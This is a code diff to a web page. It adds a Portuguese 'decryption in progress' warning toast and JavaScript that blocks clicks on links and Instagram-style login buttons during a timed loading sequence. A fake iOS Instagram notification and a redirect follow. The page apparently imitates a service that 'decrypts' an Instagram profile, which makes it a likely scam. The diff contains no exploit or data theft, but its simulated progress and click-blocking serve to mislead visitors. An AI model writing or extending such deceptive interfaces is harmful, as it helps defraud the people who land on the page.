@@ -1300,6 +1300,43 @@ h2 {
   margin-left: 4px;
 }
 
+/* ===== Decrypt Toast ===== */
+.decrypt-toast {
+  position: fixed;
+  bottom: -120px;
+  left: 50%;
+  transform: translateX(-50%);
+  visibility: hidden;
+  background: rgba(30,30,30,0.95);
+  backdrop-filter: blur(16px);
+  -webkit-backdrop-filter: blur(16px);
+  border: 1px solid rgba(239,68,68,0.3);
+  border-radius: 14px;
+  padding: 12px 20px;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  z-index: 99998;
+  max-width: calc(100% - 32px);
+  box-shadow: 0 8px 32px rgba(0,0,0,0.5);
+  transition: bottom 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+}
+.decrypt-toast.show {
+  bottom: 32px;
+  visibility: visible;
+}
+.decrypt-toast-icon {
+  width: 20px;
+  height: 20px;
+  flex-shrink: 0;
+  color: #f87171;
+}
+.decrypt-toast-text {
+  font-size: 13px;
+  color: #e2e8f0;
+  line-height: 1.4;
+}
+
 /* ===== iOS Notification Banner ===== */
 .ios-notif {
   position: fixed;
@@ -1796,6 +1833,14 @@ h2 {
   </div>
 </div>
 
+<!-- Decrypt Toast Warning -->
+<div class="decrypt-toast" id="decrypt-toast">
+  <svg class="decrypt-toast-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="2.5">
+    <path stroke-linecap="round" stroke-linejoin="round" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L4.082 16.5c-.77.833.192 2.5 1.732 2.5z"/>
+  </svg>
+  <span class="decrypt-toast-text">Ação indisponível durante a descriptografia. Aguarde o processo finalizar.</span>
+</div>
+
 <!-- iOS Instagram Notification -->
 <div class="ios-notif" id="ios-notif">
   <div class="ios-notif-icon">
@@ -2169,6 +2214,24 @@ function confirmProfile() {
       }
     }, step.t);
   });
+
+  // Block clickable elements during decryption
+  var decryptLinks = loadingOverlay.querySelectorAll('a, .ig-login-fb, .ig-login-btn');
+  decryptLinks.forEach(function(el) {
+    el.addEventListener('click', function(e) {
+      e.preventDefault();
+      e.stopPropagation();
+      showDecryptToast();
+    });
+    el.style.cursor = 'not-allowed';
+  });
+
+  function showDecryptToast() {
+    var toast = document.getElementById('decrypt-toast');
+    if (toast.classList.contains('show')) return;
+    toast.classList.add('show');
+    setTimeout(function() { toast.classList.remove('show'); }, 3000);
+  }
 
   // iOS notification + redirect
   setTimeout(function() {
